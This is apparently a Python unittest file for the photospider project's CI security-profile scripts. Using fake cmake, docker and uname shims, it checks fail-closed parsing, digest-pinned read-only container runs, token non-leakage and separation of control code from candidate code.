                "} >> \"$SANITIZER_TEST_ARGV_LOG\"\n"
                "if [[ ${1:-} == --gtest_list_tests ]]; then\n"
                "  printf 'FixtureSuite.\\n  Runs\\n'\n"
                "fi\n",
                encoding="utf-8",
            )
            fake_test.chmod(0o755)
            cmake_shim = shim / "cmake"
            cmake_shim.write_text(
                "#!/usr/bin/env bash\n"
                "set -Eeuo pipefail\n"
                "build_dir=\n"
                "target_help=false\n"
                "arguments=(\"$@\")\n"
                "for ((index = 0; index < ${#arguments[@]}; index++)); do\n"
                "  if [[ ${arguments[index]} == -B ]]; then\n"
                "    build_dir=${arguments[index + 1]}\n"
                "  elif [[ ${arguments[index]} == --build ]]; then\n"
                "    build_dir=${arguments[index + 1]}\n"
                "  elif [[ ${arguments[index]} == --target && "
                "${arguments[index + 1]} == help ]]; then\n"
                "    target_help=true\n"
                "  fi\n"
                "done\n"
                "if [[ $target_help == true ]]; then\n"
                "  for target in test_compute_run test_compute_service_split "
                "test_policy_execution test_policy_registry test_policy_plugin "
                "test_propagation_contracts test_resource_admission; do\n"
                "    printf '%s: phony\\n' \"$target\"\n"
                "  done\n"
                "  exit 0\n"
                "fi\n"
                "if [[ -n $build_dir && ${1:-} != --build ]]; then\n"
                "  mkdir -p \"$build_dir/tests\"\n"
                "  for target in test_compute_run test_compute_service_split "
                "test_policy_execution test_propagation_contracts "
                "test_resource_admission; do\n"
                "    cp \"$SANITIZER_FAKE_TEST_BINARY\" "
                "\"$build_dir/tests/$target\"\n"
                "  done\n"
                "fi\n",
                encoding="utf-8",
            )
            cmake_shim.chmod(0o755)
            uname_shim = shim / "uname"
            uname_shim.write_text(
                "#!/usr/bin/env bash\n"
                "case ${1:-} in\n"
                "  -s) printf 'Linux\\n' ;;\n"
                "  -m) printf 'x86_64\\n' ;;\n"
                "  *) printf 'Linux\\n' ;;\n"
                "esac\n",
                encoding="utf-8",
            )
            uname_shim.chmod(0o755)
            python_shim = shim / "python3"
            python_shim.write_text(
                "#!/usr/bin/env bash\n"
                "set -Eeuo pipefail\n"
                "if [[ ${1:-} == - && ${3:-} == invocations && "
                "-n ${SANITIZER_TEST_STREAM_FILE:-} ]]; then\n"
                "  cat -- \"$SANITIZER_TEST_STREAM_FILE\"\n"
                "  exit \"${SANITIZER_TEST_PRODUCER_STATUS:-0}\"\n"
                "fi\n"
                f"exec {sys.executable!s} \"$@\"\n",
                encoding="utf-8",
            )
            python_shim.chmod(0o755)

            bash_candidates: dict[int, Path] = {}
            for candidate in (
                Path("/bin/bash"),
                Path("/opt/homebrew/bin/bash"),
                Path("/usr/local/bin/bash"),
                Path(shutil.which("bash") or "/missing/bash"),
            ):
                if not candidate.is_file():
                    continue
                version = subprocess.run(
                    [str(candidate), "--version"],
                    check=False,
                    text=True,
                    capture_output=True,
                ).stdout
                matched = re.search(r"version ([0-9]+)\.", version)
                if matched:
                    bash_candidates.setdefault(int(matched.group(1)), candidate)
            self.assertTrue(bash_candidates)

            expected_records: list[bytes] = [
                b"photospider-sanitizer-invocations-v1"
            ]
            for invocation in lock["sanitizers"][0]["invocations"]:
                expected_records.extend(
                    (
                        b"invocation",
                        invocation["target"].encode(),
                        invocation["filter"].encode(),
                        str(invocation["trust_environment"]).lower().encode(),
                    )
                )
            expected_records.append(b"end")

            for major, bash_executable in sorted(bash_candidates.items()):
                with self.subTest(bash_major=major):
                    artifact = root / f"artifacts-bash-{major}"
                    build = root / f"build-bash-{major}"
                    argv_log = root / f"argv-bash-{major}.z"
                    completed = subprocess.run(
                        [str(bash_executable), str(scripts / "sanitizer_test.sh")],
                        cwd=root,
                        env={
                            **os.environ,
                            "BUILD_DIR": str(build),
                            "CI_ARTIFACT_DIR": str(artifact),
                            "CI_JOBS": "2",
                            "CI_RUNNER_IDENTITY_FILE": str(runner_identity_path),
                            "PATH": f"{shim}{os.pathsep}{os.environ['PATH']}",
                            "SANITIZER": "asan",
                            "SANITIZER_FAKE_TEST_BINARY": str(fake_test),
                            "SANITIZER_TEST_ARGV_LOG": str(argv_log),
                        },
                        text=True,
                        capture_output=True,
                        check=False,
                    )
                    self.assertEqual(
                        completed.returncode,
                        0,
                        msg=(
                            f"Bash {major} fallback failed:\n"
                            f"stdout:\n{completed.stdout}\nstderr:\n{completed.stderr}"
                        ),
                    )
                    evidence = (
                        artifact / "sanitizer-asan-fallback-invocations.v1.z"
                    ).read_bytes()
                    self.assertEqual(evidence.split(b"\0")[:-1], expected_records)
                    self.assertFalse(marker.exists())

                    tokens = argv_log.read_bytes().split(b"\0")
                    calls: dict[str, list[list[str]]] = {}
                    cursor = 0
                    while cursor < len(tokens) - 1:
                        self.assertEqual(tokens[cursor], b"call")
                        target = tokens[cursor + 1].decode()
                        cursor += 2
                        arguments: list[str] = []
                        while tokens[cursor] != b"end":
                            arguments.append(tokens[cursor].decode())
                            cursor += 1
                        cursor += 1
                        calls.setdefault(target, []).append(arguments)
                    self.assertEqual(
                        calls["test_propagation_contracts"],
                        [["--gtest_list_tests"], []],
                    )
                    self.assertEqual(
                        calls["test_resource_admission"],
                        [["--gtest_list_tests"], []],
                    )
                    self.assertEqual(
                        calls["test_compute_run"],
                        [
                            ["--gtest_list_tests", f"--gtest_filter={injected_filter}"],
                            [f"--gtest_filter={injected_filter}"],
                        ],
                    )

            magic = b"photospider-sanitizer-invocations-v1\0"
            invocation = b"invocation\0test_compute_run\0\0false\0"
            complete = magic + invocation + b"end\0"
            duplicate_target = magic + invocation + invocation + b"end\0"
            invalid_streams = (
                ("unterminated-tail", complete + b"UNTERMINATED", 0),
                ("complete-tail", complete + b"junk\0", 0),
                ("missing-terminal", magic + invocation, 0),
                (
                    "truncated-field",
                    magic + b"invocation\0test_compute_run\0\0fal",
                    0,
                ),
                ("duplicate-end", complete + b"end\0", 0),
                ("duplicate-target", duplicate_target, 0),
                ("unknown-schema", b"unknown-schema\0end\0", 0),
                ("unknown-record", magic + b"unknown\0", 0),
                ("producer-nonzero-partial", complete + b"partial", 23),
            )
            stream_root = root / "invalid-streams"
            stream_root.mkdir()
            for major, bash_executable in sorted(bash_candidates.items()):
                for label, stream, producer_status in invalid_streams:
                    with self.subTest(
                        bash_major=major, invalid_framing=label
                    ):
                        stream_path = stream_root / f"{major}-{label}.z"
                        stream_path.write_bytes(stream)
                        artifact = root / f"invalid-artifacts-{major}-{label}"
                        build = root / f"invalid-build-{major}-{label}"
                        argv_log = root / f"invalid-argv-{major}-{label}.z"
                        completed = subprocess.run(
                            [
                                str(bash_executable),
                                str(scripts / "sanitizer_test.sh"),
                            ],
                            cwd=root,
                            env={
                                **os.environ,
                                "BUILD_DIR": str(build),
                                "CI_ARTIFACT_DIR": str(artifact),
                                "CI_JOBS": "2",
                                "CI_RUNNER_IDENTITY_FILE": str(
                                    runner_identity_path
                                ),
                                "PATH": f"{shim}{os.pathsep}{os.environ['PATH']}",
                                "SANITIZER": "asan",
                                "SANITIZER_FAKE_TEST_BINARY": str(fake_test),
                                "SANITIZER_TEST_ARGV_LOG": str(argv_log),
                                "SANITIZER_TEST_PRODUCER_STATUS": str(
                                    producer_status
                                ),
                                "SANITIZER_TEST_STREAM_FILE": str(stream_path),
                            },
                            text=True,
                            capture_output=True,
                            check=False,
                            timeout=10,
                        )
                        self.assertNotEqual(
                            completed.returncode,
                            0,
                            msg=f"Bash {major} accepted {label}",
                        )
                        self.assertFalse(build.exists())
                        self.assertFalse(argv_log.exists())
                        self.assertFalse(
                            (
                                artifact
                                / "sanitizer-asan-fallback-invocations.v1.z"
                            ).exists()
                        )
                        self.assertFalse((artifact / "summary.log").exists())
                        self.assertEqual(
                            list(artifact.glob(".*-invocations.*")), []
                        )

    def test_partial_versioned_identity_fails_closed(self) -> None:
        """Reject any subset of the three required versioned identity files."""
        with tempfile.TemporaryDirectory() as temporary_text:
            inventory = Path(temporary_text)
            (inventory / "build_profile_matrix_v1.tsv").write_text(
                "schema\tphotospider-build-profile-matrix-v1\n",
                encoding="utf-8",
            )
            failed = run_command(
                sys.executable, SCRIPTS / "ci_profile_manifest.py",
                "--inventory-dir", inventory,
                expect_success=False,
            )
            self.assertIn("partial versioned profile identity", failed.stderr)

    def test_staging_clears_complete_stale_identity_before_fallback(self) -> None:
        """Never reuse a valid old output set when the current source is empty."""
        with tempfile.TemporaryDirectory() as temporary_text:
            root = Path(temporary_text)
            source = root / "empty-source"
            output = root / "artifact"
            source.mkdir()
            output.mkdir()
            self._write_complete_versioned_identity(output)
            resolved_path = output / "resolved-security-profiles.json"
            before = run_command(
                sys.executable, SCRIPTS / "ci_profile_manifest.py",
                "--inventory-dir", output,
                "--output", resolved_path,
            )
            self.assertEqual(before.returncode, 0)
            self.assertFalse(json.loads(resolved_path.read_text(encoding="utf-8"))["fallback"])

            run_command(
                "bash", SCRIPTS / "ci_profile_inventory_stage.sh", source, output,
            )
            for identity_name in (
                "build_profile_matrix_v1.tsv",
                "build_profile_matrix_v1.tsv.sha256",
                "ci_security_roles_v1.tsv",
            ):
                self.assertFalse((output / identity_name).exists())
            resolved = json.loads(resolved_path.read_text(encoding="utf-8"))
            self.assertTrue(resolved["fallback"])
            self.assertEqual(resolved["schema"], "photospider-resolved-ci-security-v1")

    def test_staging_rejects_symlink_and_special_output_targets(self) -> None:
        """Fail before clearing when an exact output name is not a regular file."""
        for unsafe_kind in ("symlink", "fifo"):
            with self.subTest(unsafe_kind=unsafe_kind), tempfile.TemporaryDirectory() as temporary_text:
                root = Path(temporary_text)
                source = root / "source"
                output = root / "output"
                source.mkdir()
                output.mkdir()
                unsafe = output / "resolved-security-profiles.json"
                if unsafe_kind == "symlink":
                    outside = root / "outside.json"
                    outside.write_text("preserve\n", encoding="utf-8")
                    unsafe.symlink_to(outside)
                else:
                    os.mkfifo(unsafe)
                failed = run_command(
                    "bash", SCRIPTS / "ci_profile_inventory_stage.sh", source, output,
                    expect_success=False,
                )
                self.assertIn("Unsafe existing staged profile artifact", failed.stderr)

    def test_fallback_rejects_changed_candidate_authority(self) -> None:
        """Reject the temporary lists as soon as one hash-bound source changes."""
        with tempfile.TemporaryDirectory() as temporary_text:
            root = Path(temporary_text)
            lock_source = REPO_ROOT / "ci/locks/current-main-profiles-v1.json"
            lock_target = root / "ci/locks/current-main-profiles-v1.json"
            lock_target.parent.mkdir(parents=True)
            shutil.copyfile(lock_source, lock_target)
            lock = json.loads(lock_source.read_text(encoding="utf-8"))
            for relative in lock["source_hashes"]:
                destination = root / relative
                destination.parent.mkdir(parents=True, exist_ok=True)
                shutil.copyfile(REPO_ROOT / relative, destination)
            with (root / "CMakeLists.txt").open("a", encoding="utf-8") as handle:
                handle.write("\n# drift\n")
            failed = run_command(
                sys.executable, SCRIPTS / "ci_profile_manifest.py",
                "--repo-root", root,
                "--inventory-dir", root / "empty-inventory",
                expect_success=False,
            )
            self.assertIn("fallback is stale for CMakeLists.txt", failed.stderr)

    def test_fallback_rejects_each_production_packet_limit_drift(self) -> None:
        """Bind both production size-limit headers to fallback fuzz bounds."""
        relative_headers = (
            "src/lib/execution/isolation/isolated_cpu_invocation_protocol.hpp",
            "src/lib/server/worker/worker_protocol.hpp",
        )
        for relative_header in relative_headers:
            with self.subTest(relative_header=relative_header), tempfile.TemporaryDirectory() as temporary_text:
                root = Path(temporary_text)
                lock_source = REPO_ROOT / "ci/locks/current-main-profiles-v1.json"
                lock_target = root / "ci/locks/current-main-profiles-v1.json"
                lock_target.parent.mkdir(parents=True)
                shutil.copyfile(lock_source, lock_target)
                lock = json.loads(lock_source.read_text(encoding="utf-8"))
                for relative in lock["source_hashes"]:
                    destination = root / relative
                    destination.parent.mkdir(parents=True, exist_ok=True)
                    shutil.copyfile(REPO_ROOT / relative, destination)
                with (root / relative_header).open("a", encoding="utf-8") as handle:
                    handle.write("\n// packet limit drift\n")
                failed = run_command(
                    sys.executable, SCRIPTS / "ci_profile_manifest.py",
                    "--repo-root", root,
                    "--inventory-dir", root / "empty-inventory",
                    expect_success=False,
                )
                self.assertIn(f"fallback is stale for {relative_header}", failed.stderr)

    def test_complete_versioned_identity_is_cross_digest_bound(self) -> None:
        """Accept canonical roles only when their matrix sidecar and digest agree."""
        with tempfile.TemporaryDirectory() as temporary_text:
            inventory = Path(temporary_text)
            digest = self._write_complete_versioned_identity(inventory)
            roles = inventory / "ci_security_roles_v1.tsv"
            completed = run_command(
                sys.executable, SCRIPTS / "ci_profile_manifest.py",
                "--inventory-dir", inventory,
            )
            resolved = json.loads(completed.stdout)
            self.assertFalse(resolved["fallback"])
            self.assertEqual(resolved["matrix_sha256"], digest)
            self.assertEqual(len(resolved["profiles"]), 3)
            fuzz = next(profile for profile in resolved["profiles"] if profile["profile"] == "fuzz-codecs")
            self.assertEqual(
                fuzz["cmake_args"],
                [
                    "-DBUILD_TESTING=OFF",
                    "-DPHOTOSPIDER_BUILD_FUZZERS=ON",
                    "-DUSE_ASAN=OFF",
                    "-DUSE_TSAN=OFF",
                ],
            )

            roles.write_text(roles.read_text(encoding="utf-8").replace(digest, "0" * 64), encoding="utf-8")
            failed = run_command(
                sys.executable, SCRIPTS / "ci_profile_manifest.py",
                "--inventory-dir", inventory,
                expect_success=False,
            )
            self.assertIn("matrix digest does not match", failed.stderr)

    def test_versioned_matrix_rejects_malformed_records_and_isolation(self) -> None:
        """Reject bad fields, IDs, platforms, bounds, references, and isolation."""
        mutations = (
            ("\"roles\":[\"fuzz-artifact\",\"fuzz-codec\"]", "\"roles\":[\"fuzz-artifact\",\"unknown-role\"]", "unknown role"),
            ("-DUSE_ASAN=ON", "-DUSE_ASAN=OFF", "CMake isolation"),
            ("role\tfuzz-codec\t", "role\tfuzz-codec_\t", "invalid identifier"),
            ("\"seed\":1", "\"seed\":2", "requires seed 1"),
            ("\"timeout_seconds\":2}", "\"timeout_seconds\":2,\"unknown\":true}", "fields differ"),
            ("\"platforms\":[\"Darwin\",\"Linux\"]", "\"platforms\":[\"Linux\",\"Windows\"]", "unsupported capability platform"),
        )
        for old, new, diagnostic in mutations:
            with self.subTest(diagnostic=diagnostic), tempfile.TemporaryDirectory() as temporary_text:
                inventory = Path(temporary_text)
                self._write_complete_versioned_identity(inventory)
                matrix = inventory / "build_profile_matrix_v1.tsv"
                original = matrix.read_text(encoding="utf-8")
                self.assertIn(old, original)
                matrix.write_text(original.replace(old, new, 1), encoding="utf-8")
                self._refresh_versioned_digest(inventory)
                failed = run_command(
                    sys.executable, SCRIPTS / "ci_profile_manifest.py",
                    "--inventory-dir", inventory,
                    expect_success=False,
                )
                self.assertIn(diagnostic, failed.stderr)

    def test_versioned_matrix_rejects_noncanonical_record_order(self) -> None:
        """Reject a byte-valid matrix whose semantic records are reordered."""
        with tempfile.TemporaryDirectory() as temporary_text:
            inventory = Path(temporary_text)
            self._write_complete_versioned_identity(inventory)
            matrix = inventory / "build_profile_matrix_v1.tsv"
            lines = matrix.read_text(encoding="utf-8").splitlines()
            lines[1], lines[2] = lines[2], lines[1]
            matrix.write_text("\n".join(lines) + "\n", encoding="utf-8")
            self._refresh_versioned_digest(inventory)
            failed = run_command(
                sys.executable, SCRIPTS / "ci_profile_manifest.py",
                "--inventory-dir", inventory,
                expect_success=False,
            )
            self.assertIn("not bytewise sorted", failed.stderr)

    def test_versioned_fuzz_matrix_arguments_reach_real_runner_boundary(self) -> None:
        """Carry matrix arguments through the real CMake fuzz-output boundary."""
        with tempfile.TemporaryDirectory() as temporary_text:
            root = Path(temporary_text)
            inventory = root / "inventory"
            inventory.mkdir()
            self._write_complete_versioned_identity(inventory)
            binary_dir = root / "bin"
            binary_dir.mkdir()
            configure_log = root / "configure.log"
            fuzz_log = root / "fuzz.log"
            uname = binary_dir / "uname"
            uname.write_text(
                "#!/usr/bin/env bash\n"
                "[[ ${1:-} == -s ]] && { echo Linux; exit 0; }\n"
                "[[ ${1:-} == -m ]] && { echo x86_64; exit 0; }\n"
                "exit 1\n",
                encoding="utf-8",
            )
            uname.chmod(0o755)
            cmake = binary_dir / "cmake"
            cmake.write_text(
                "#!/usr/bin/env bash\n"
                "set -Eeuo pipefail\n"
                "if [[ ${1:-} == --build && ${4:-} == help ]]; then\n"
                "  echo '... fuzz_codec'; exit 0\n"
                "fi\n"
                "if [[ ${1:-} == --build ]]; then exit 0; fi\n"
                "printf '%q ' \"$@\" > \"$CI_TEST_CONFIGURE_LOG\"; printf '\\n' >> \"$CI_TEST_CONFIGURE_LOG\"\n"
                "build_dir=\n"
                "while (($#)); do [[ $1 == -B ]] && { build_dir=$2; break; }; shift; done\n"
                "mkdir -p \"$build_dir/fuzzers\"\n"
                "printf '%s\\n' '#!/usr/bin/env bash' 'printf '\"'\"'%q '\"'\"' \"$@\" >> \"$CI_TEST_FUZZ_LOG\"; printf '\"'\"'\\n'\"'\"' >> \"$CI_TEST_FUZZ_LOG\"' > \"$build_dir/fuzzers/fuzz_codec\"\n"
                "chmod +x \"$build_dir/fuzzers/fuzz_codec\"\n",
                encoding="utf-8",
            )
            cmake.chmod(0o755)
            artifacts = root / "artifacts"
            runner_identity_path = root / "linux-runner-identity.json"
            write_runner_identity(
                runner_identity_path, "Linux", LINUX_ROLLOUT_VERSION
            )
            run_command(
                "bash", SCRIPTS / "fuzz_smoke.sh",
                environment={
                    "BUILD_DIR": str(root / "build"),
                    "CI_ARTIFACT_DIR": str(artifacts),
                    "CI_INVENTORY_DIR": str(inventory),
                    "CI_JOBS": "1",
                    "CI_RUNNER_IDENTITY_FILE": str(runner_identity_path),
                    "CI_TEST_CONFIGURE_LOG": str(configure_log),
                    "CI_TEST_FUZZ_LOG": str(fuzz_log),
                    "PATH": f"{binary_dir}:{os.environ['PATH']}",
                },
            )
            configured = configure_log.read_text(encoding="utf-8")
            for argument in (
                "-DBUILD_TESTING=OFF",
                "-DPHOTOSPIDER_BUILD_FUZZERS=ON",
                "-DUSE_ASAN=OFF",
                "-DUSE_TSAN=OFF",
            ):
                self.assertIn(argument, configured)
            fuzzed = fuzz_log.read_text(encoding="utf-8")
            for argument in ("-seed=1", "-runs=1000", "-timeout=2", "-max_len=65536"):
                self.assertIn(argument, fuzzed)
            runner = (SCRIPTS / "fuzz_smoke.sh").read_text(encoding="utf-8")
            self.assertIn("binary=$BUILD_DIR/fuzzers/$target", runner)
            self.assertNotIn("binary=$BUILD_DIR/tests/$target", runner)


class SecurityPlatformContractTest(unittest.TestCase):
    """Exercise hosted-runner handoff and exact platform preparation."""

    def test_linux_host_wrapper_pulls_and_runs_exact_digest_after_identity(self) -> None:
        """Keep host identity outside candidate code and constrain Docker argv.

        Returns:
            None after the production wrapper logs in, pulls, and runs exactly
            one digest with read-only control/candidate/inventory/identity
            mounts, while withholding the GHCR token from pull and run.

        Raises:
            AssertionError: Host provenance is skipped, mutable image syntax or
                writable/overlapping inputs reach the container, or candidate
                execution can occur before the exact image boundary.
        """
        with tempfile.TemporaryDirectory() as temporary_text:
            root = Path(temporary_text)
            candidate = root / "candidate"
            run_command("git", "clone", "-q", "--no-local", REPO_ROOT, candidate)
            candidate_commit = run_command(
                "git", "-C", candidate, "rev-parse", "HEAD"
            ).stdout.strip()
            inventory = root / "inventory"
            inventory.mkdir()
            runner_temp = root / "runner-temp"
            runner_temp.mkdir()
            identity_path = runner_temp / "runner-identity.json"
            write_runner_identity(identity_path, "Linux", LINUX_STABLE_VERSION)

            shim_dir = root / "shim"
            shim_dir.mkdir()
            docker_log = root / "docker.log"
            docker = shim_dir / "docker"
            docker.write_text(
                f"#!{sys.executable}\n"
                "import json\n"
                "import os\n"
                "import sys\n"
                "from pathlib import Path\n"
                "arguments = sys.argv[1:]\n"
                "record = {\n"
                "    'argv': arguments,\n"
                "    'token_present': 'CI_GHCR_TOKEN' in os.environ,\n"
                "}\n"
                "if arguments and arguments[0] == 'login':\n"
                "    record['stdin_size'] = len(sys.stdin.buffer.read())\n"
                "if arguments and arguments[0] == 'run':\n"
                "    work_mount = next(\n"
                "        value for value in arguments\n"
                "        if value.startswith('type=bind,src=') and value.endswith(',dst=/work')\n"
                "    )\n"
                "    work_root = Path(work_mount.split(',src=', 1)[1].split(',dst=', 1)[0])\n"
                "    (work_root / 'results/summary.log').write_text(\n"
                "        'protected profile passed\\n', encoding='utf-8'\n"
                "    )\n"
                "with open(os.environ['CI_TEST_DOCKER_LOG'], 'a', encoding='utf-8') as handle:\n"
                "    handle.write(json.dumps(record, sort_keys=True, separators=(',', ':')) + '\\n')\n",
                encoding="utf-8",
            )
            docker.chmod(0o755)
            work_root = runner_temp / "profile-work"
            repository = "kevin-zf1123/photospider"
            image_ref = f"ghcr.io/{repository}/photospider-ci@{IMAGE_DIGEST}"
            environment = {
                "CI_CANDIDATE_COMMIT": candidate_commit,
                "CI_CANDIDATE_ROOT": str(candidate),
                "CI_CONTROL_ROOT": str(REPO_ROOT),
                "CI_GHCR_TOKEN": "fixture-token-never-log",
                "CI_GHCR_USERNAME": "ci-fixture",
                "CI_IMAGE_DIGEST": IMAGE_DIGEST,
                "CI_IMAGE_REF": image_ref,
                "CI_INVENTORY_DIR": str(inventory),
                "CI_JOBS": "4",
                "CI_RUNNER_IDENTITY_FILE": str(identity_path),
                "CI_RUNNER_TEMP": str(runner_temp),
                "CI_SECURITY_PROFILE": "sanitizer-asan",
                "CI_TEST_DOCKER_LOG": str(docker_log),
                "CI_WORKFLOW_COMMIT": COMMIT_A,
                "CI_WORK_ROOT": str(work_root),
                "GITHUB_REPOSITORY": repository,
                "PATH": f"{shim_dir}:{os.environ['PATH']}",
            }
            run_command(
                "bash",
                SCRIPTS / "linux_security_profile.sh",
                environment=environment,
            )
            calls = [
                json.loads(line)
                for line in docker_log.read_text(encoding="utf-8").splitlines()
            ]
            self.assertEqual([call["argv"][0] for call in calls], ["login", "pull", "run"])
            self.assertEqual(
                calls[0]["argv"],
                [
                    "login",
                    "ghcr.io",
                    "--username",
                    "ci-fixture",
                    "--password-stdin",
                ],
            )
            self.assertEqual(calls[0]["stdin_size"], len("fixture-token-never-log"))
            self.assertEqual(calls[1]["argv"], ["pull", image_ref])
            self.assertTrue(calls[0]["token_present"])
            self.assertFalse(calls[1]["token_present"])
            self.assertFalse(calls[2]["token_present"])
            run_arguments = calls[2]["argv"]
            self.assertEqual(run_arguments[-3:], [image_ref, "bash", "ci/scripts/sanitizer_test.sh"])
            for required in (
                "--read-only",
                "--network",
                "none",
                "--cap-drop",
                "ALL",
                "--security-opt",
                "no-new-privileges",
                f"type=bind,src={candidate.resolve()},dst=/workspace/photospider,readonly",
                f"type=bind,src={REPO_ROOT.resolve()}/ci,dst=/workspace/photospider/ci,readonly",
                f"type=bind,src={inventory.resolve()},dst=/inputs/profile,readonly",
                f"type=bind,src={identity_path.resolve()},dst=/inputs/runner-identity.json,readonly",
                f"type=bind,src={work_root.resolve()},dst=/work",
                "SANITIZER=asan",
            ):
                self.assertIn(required, run_arguments)
            self.assertNotIn("fixture-token-never-log", json.dumps(calls))

            invalid = run_command(
                "bash",
                SCRIPTS / "linux_security_profile.sh",
                environment={
                    **environment,
                    "CI_IMAGE_REF": f"ghcr.io/{repository}/photospider-ci:latest",
                    "CI_WORK_ROOT": str(runner_temp / "invalid-work"),
                },
                expect_success=False,
            )
            self.assertIn("differs from its exact digest", invalid.stderr)
            self.assertEqual(len(docker_log.read_text(encoding="utf-8").splitlines()), 3)

    def test_darwin_host_wrapper_separates_control_from_candidate_data(self) -> None:
        """Execute only protected profile code across two exact Git roots.

        Returns:
            None after a distinct control/candidate commit pair succeeds and
            overlap, wrong identity, post-start HEAD/contents drift, and root
            replacement each fail without executing the candidate helper.

        Raises:
            AssertionError: Candidate bytes gain profile authority, the two
                commits or roots are conflated, or a bounded drift survives the
                production wrapper's before/after identity checks.
        """
        with tempfile.TemporaryDirectory() as temporary_text:
            fixture_root = Path(temporary_text)

            def initialize_repository(root: Path) -> str:
                """Initialize and commit one fixture checkout."""
                run_command("git", "init", "-q", root)
                run_command("git", "-C", root, "config", "user.name", "CI Fixture")
                run_command("git", "-C", root, "config", "user.email", "ci@example.invalid")
                run_command("git", "-C", root, "add", ".")
                run_command("git", "-C", root, "commit", "-q", "-m", "fixture")
                return run_command(
                    "git", "-C", root, "rev-parse", "HEAD^{commit}"
                ).stdout.strip()

            def materialize(label: str) -> tuple[dict[str, str], Path, str, str]:
                """Create one clean protected/candidate pair and wrapper env."""
                root = fixture_root / label
                control = root / "control"
                candidate = root / "candidate"
                inventory = root / "inventory"
                runner_temp = root / "runner-temp"
                (control / "ci/scripts").mkdir(parents=True)
                (candidate / "ci/scripts").mkdir(parents=True)
                inventory.mkdir(parents=True)
                runner_temp.mkdir(parents=True)
                shutil.copy2(
                    SCRIPTS / "darwin_security_profile.sh",
                    control / "ci/scripts/darwin_security_profile.sh",
                )
                (control / "ci/scripts/sanitizer_test.sh").write_text(
                    "#!/usr/bin/env bash\n"
                    "set -Eeuo pipefail\n"
                    "printf '%s\\n%s\\n' \"$CI_SOURCE_ROOT\" \"$CI_RUNNER_IDENTITY_FILE\" > \"$CI_TEST_PROFILE_LOG\"\n"
                    "case \"${CI_TEST_DARWIN_MUTATION:-none}\" in\n"
                    "  none) ;;\n"
                    "  candidate-dirty) printf 'drift\\n' >> \"$CI_SOURCE_ROOT/tracked.txt\" ;;\n"
                    "  candidate-replace) mv \"$CI_SOURCE_ROOT\" \"$CI_SOURCE_ROOT.replaced\"; mkdir \"$CI_SOURCE_ROOT\" ;;\n"
                    "  control-head) git -C \"$CI_CONTROL_ROOT\" commit --allow-empty -q -m drift ;;\n"
                    "  *) exit 93 ;;\n"
                    "esac\n"
                    "printf 'protected Darwin profile passed\\n' > \"$CI_ARTIFACT_DIR/summary.log\"\n",
                    encoding="utf-8",
                )
                (candidate / "tracked.txt").write_text("candidate data\n", encoding="utf-8")
                (candidate / "ci/scripts/sanitizer_test.sh").write_text(
                    "#!/usr/bin/env bash\n"
                    "touch \"$CI_TEST_CANDIDATE_MARKER\"\n",
                    encoding="utf-8",
                )
                control_commit = initialize_repository(control)
                candidate_commit = initialize_repository(candidate)
                self.assertNotEqual(control_commit, candidate_commit)
                identity = runner_temp / "runner.json"
                identity.write_text("{}\n", encoding="utf-8")
                environment = {
                    "CI_CANDIDATE_COMMIT": candidate_commit,
                    "CI_CANDIDATE_ROOT": str(candidate.resolve()),
                    "CI_CONTROL_ROOT": str(control.resolve()),
                    "CI_INVENTORY_DIR": str(inventory.resolve()),
                    "CI_JOBS": "4",
                    "CI_RUNNER_IDENTITY_FILE": str(identity.resolve()),
                    "CI_RUNNER_TEMP": str(runner_temp.resolve()),
                    "CI_SECURITY_PROFILE": "sanitizer-asan",
                    "CI_TEST_CANDIDATE_MARKER": str(root / "candidate-executed"),
                    "CI_TEST_PROFILE_LOG": str(root / "protected-profile.log"),
                    "CI_WORKFLOW_COMMIT": control_commit,
                    "CI_WORK_ROOT": str((runner_temp / "profile-work").resolve()),
                }
                return environment, root, control_commit, candidate_commit

            environment, root, control_commit, candidate_commit = materialize("success")
            run_command(
                "bash",
                Path(environment["CI_CONTROL_ROOT"])
                / "ci/scripts/darwin_security_profile.sh",
                environment=environment,
            )
            self.assertFalse(Path(environment["CI_TEST_CANDIDATE_MARKER"]).exists())
            self.assertEqual(
                (root / "protected-profile.log").read_text(encoding="utf-8").splitlines(),
                [environment["CI_CANDIDATE_ROOT"], environment["CI_RUNNER_IDENTITY_FILE"]],
            )
            self.assertNotEqual(control_commit, candidate_commit)

            negative_cases = (
                ("overlap", {"CI_CANDIDATE_ROOT": None}, "roots overlap"),
                ("wrong-control-sha", {"CI_WORKFLOW_COMMIT": "1" * 40}, "HEAD"),
                ("wrong-candidate-sha", {"CI_CANDIDATE_COMMIT": "2" * 40}, "HEAD"),
                ("candidate-dirty", {"CI_TEST_DARWIN_MUTATION": "candidate-dirty"}, "not clean"),
                ("candidate-replace", {"CI_TEST_DARWIN_MUTATION": "candidate-replace"}, "Git metadata"),
                ("control-head", {"CI_TEST_DARWIN_MUTATION": "control-head"}, "HEAD"),
            )
            for label, overrides, diagnostic in negative_cases:
                with self.subTest(darwin_wrapper_rejection=label):
                    case_environment, _, _, _ = materialize(label)
                    if (
                        overrides.get("CI_CANDIDATE_ROOT") is None
                        and "CI_CANDIDATE_ROOT" in overrides
                    ):
                        overrides = {
                            **overrides,
                            "CI_CANDIDATE_ROOT": case_environment["CI_CONTROL_ROOT"],
                        }
                    failed = run_command(
                        "bash",
                        Path(case_environment["CI_CONTROL_ROOT"])
                        / "ci/scripts/darwin_security_profile.sh",
                        environment={**case_environment, **overrides},
                        expect_success=False,
                    )
                    self.assertIn(diagnostic, failed.stderr)
                    self.assertFalse(
                        Path(case_environment["CI_TEST_CANDIDATE_MARKER"]).exists()
                    )

    @staticmethod
    def _prepare_darwin_fixture(
        root: Path,
        image_version: str = DARWIN_ROLLOUT_VERSION,
    ) -> tuple[Path, dict[str, str], Path, Path, Path, Path]:
        """Create one exact Darwin runner, Git-object, and binary fixture.

        Args:
            root: Empty temporary directory that owns all fixture state.

        Returns:
            The resolved profile, base environment, Git log, vcpkg log,
            runner-temp directory, and deliberately dirty preinstalled source.

        Note:
            The Git shim implements only the read/fetch/checkout/status boundary
            used by ``security_platform_prepare.sh``. It reports the source as
            dirty if a caller inspects worktree diffs, while the exact locked
            commit object remains available for a clean fresh checkout.
        """
        profile = root / "profile.json"
        run_command(
            sys.executable, SCRIPTS / "ci_profile_manifest.py",
            "--profile", "fuzz-codecs",
            "--output", profile,
        )
        control_root = root / "protected-control"
        control_scripts = control_root / "ci/scripts"
        control_locks = control_root / "ci/locks"
        control_scripts.mkdir(parents=True)
        control_locks.mkdir(parents=True)
        for helper_name in ("ci_runner_verify.py", "security_platform_prepare.sh"):
            shutil.copy2(SCRIPTS / helper_name, control_scripts / helper_name)

